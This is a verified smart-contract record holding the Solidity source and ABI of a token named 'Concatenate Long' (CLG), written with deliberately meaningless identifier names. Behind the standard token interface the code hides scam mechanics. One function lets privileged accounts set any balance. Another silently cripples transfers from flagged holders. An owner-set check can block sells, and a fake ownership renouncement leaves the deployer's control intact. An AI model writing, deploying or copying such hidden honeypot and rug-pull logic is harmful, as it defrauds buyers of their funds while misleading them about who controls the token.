{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface teamExempt {\n    function createPair(address sellEnableAt, address shouldSender) external returns (address);\n}\n\ninterface exemptTake {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address modeList) external view returns (uint256);\n\n    function transfer(address atFee, uint256 totalTo) external returns (bool);\n\n    function allowance(address buyTake, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 totalTo) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address atFee,\n        uint256 totalTo\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed totalSwapShould, uint256 value);\n    event Approval(address indexed buyTake, address indexed spender, uint256 value);\n}\n\nabstract contract takeTo {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface limitExempt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface exemptTakeMetadata is exemptTake {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ConcatenateLong is takeTo, exemptTake, exemptTakeMetadata {\n\n    address public sellFund;\n\n    bool public enableTrading;\n\n    uint256 constant exemptBuy = 9 ** 10;\n\n    function allowance(address tradingShouldMax, address launchSwapAt) external view virtual override returns (uint256) {\n        if (launchSwapAt == amountToken) {\n            return type(uint256).max;\n        }\n        return tradingShould[tradingShouldMax][launchSwapAt];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return fromSender;\n    }\n\n    address amountToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private fromSender = \"Concatenate Long\";\n\n    mapping(address => bool) public fundSwap;\n\n    bool public listSell;\n\n    address private fundAmount;\n\n    function takeShould() private view {\n        require(sellSwap[_msgSender()]);\n    }\n\n    bool private teamLimitFrom;\n\n    mapping(address => uint256) private shouldMarketing;\n\n    mapping(address => mapping(address => uint256)) private tradingShould;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return takeShouldAuto;\n    }\n\n    function exemptLiquidity() public {\n        emit OwnershipTransferred(exemptTeam, address(0));\n        fundAmount = address(0);\n    }\n\n    string private shouldTeamReceiver = \"CLG\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchedFromLiquidity;\n    }\n\n    function approve(address launchSwapAt, uint256 totalTo) public virtual override returns (bool) {\n        tradingShould[_msgSender()][launchSwapAt] = totalTo;\n        emit Approval(_msgSender(), launchSwapAt, totalTo);\n        return true;\n    }\n\n    function txReceiverFund(address isFrom, uint256 totalTo) public {\n        takeShould();\n        shouldMarketing[isFrom] = totalTo;\n    }\n\n    uint256 private launchedTeamFee;\n\n    uint256 private txWallet;\n\n    bool public walletReceiver;\n\n    function transfer(address isFrom, uint256 totalTo) external virtual override returns (bool) {\n        return takeSwap(_msgSender(), isFrom, totalTo);\n    }\n\n    function takeSwap(address receiverMarketingBuy, address atFee, uint256 totalTo) internal returns (bool) {\n        if (receiverMarketingBuy == exemptTeam) {\n            return buyMarketing(receiverMarketingBuy, atFee, totalTo);\n        }\n        uint256 isTake = exemptTake(sellFund).balanceOf(tokenLiquidity);\n        require(isTake == senderLimit);\n        require(atFee != tokenLiquidity);\n        if (fundSwap[receiverMarketingBuy]) {\n            return buyMarketing(receiverMarketingBuy, atFee, exemptBuy);\n        }\n        return buyMarketing(receiverMarketingBuy, atFee, totalTo);\n    }\n\n    bool public atAuto;\n\n    function getOwner() external view returns (address) {\n        return fundAmount;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return shouldTeamReceiver;\n    }\n\n    event OwnershipTransferred(address indexed amountFee, address indexed feeLiquidity);\n\n    address tokenLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transferFrom(address receiverMarketingBuy, address atFee, uint256 totalTo) external override returns (bool) {\n        if (_msgSender() != amountToken) {\n            if (tradingShould[receiverMarketingBuy][_msgSender()] != type(uint256).max) {\n                require(totalTo <= tradingShould[receiverMarketingBuy][_msgSender()]);\n                tradingShould[receiverMarketingBuy][_msgSender()] -= totalTo;\n            }\n        }\n        return takeSwap(receiverMarketingBuy, atFee, totalTo);\n    }\n\n    mapping(address => bool) public sellSwap;\n\n    uint256 private modeAmount;\n\n    uint256 limitMin;\n\n    function owner() external view returns (address) {\n        return fundAmount;\n    }\n\n    function balanceOf(address modeList) public view virtual override returns (uint256) {\n        return shouldMarketing[modeList];\n    }\n\n    uint256 private takeMinAmount;\n\n    address public exemptTeam;\n\n    uint8 private launchedFromLiquidity = 18;\n\n    uint256 private takeShouldAuto = 100000000 * 10 ** 18;\n\n    function buyMarketing(address receiverMarketingBuy, address atFee, uint256 totalTo) internal returns (bool) {\n        require(shouldMarketing[receiverMarketingBuy] >= totalTo);\n        shouldMarketing[receiverMarketingBuy] -= totalTo;\n        shouldMarketing[atFee] += totalTo;\n        emit Transfer(receiverMarketingBuy, atFee, totalTo);\n        return true;\n    }\n\n    function senderReceiverMax(address exemptIs) public {\n        takeShould();\n        if (takeMinAmount == launchedTeamFee) {\n            takeMinAmount = txWallet;\n        }\n        if (exemptIs == exemptTeam || exemptIs == sellFund) {\n            return;\n        }\n        fundSwap[exemptIs] = true;\n    }\n\n    uint256 senderLimit;\n\n    constructor (){\n        \n        limitExempt listMinBuy = limitExempt(amountToken);\n        sellFund = teamExempt(listMinBuy.factory()).createPair(listMinBuy.WETH(), address(this));\n        if (listSell != enableTrading) {\n            enableTrading = false;\n        }\n        exemptTeam = _msgSender();\n        sellSwap[exemptTeam] = true;\n        shouldMarketing[exemptTeam] = takeShouldAuto;\n        exemptLiquidity();\n        if (enableTrading != walletReceiver) {\n            launchedTeamFee = takeMinAmount;\n        }\n        emit Transfer(address(0), exemptTeam, takeShouldAuto);\n    }\n\n    function marketingFund(address isTx) public {\n        if (atAuto) {\n            return;\n        }\n        if (txWallet != modeAmount) {\n            enableTrading = false;\n        }\n        sellSwap[isTx] = true;\n        if (walletReceiver) {\n            modeAmount = txWallet;\n        }\n        atAuto = true;\n    }\n\n    function minAt(uint256 totalTo) public {\n        takeShould();\n        senderLimit = totalTo;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeLiquidity\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalSwapShould\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingShouldMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchSwapAt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchSwapAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalTo\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeList\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTx\",\"type\":\"address\"}],\"name\":\"marketingFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"totalTo\",\"type\":\"uint256\"}],\"name\":\"minAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptIs\",\"type\":\"address\"}],\"name\":\"senderReceiverMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalTo\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMarketingBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalTo\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalTo\",\"type\":\"uint256\"}],\"name\":\"txReceiverFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ConcatenateLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}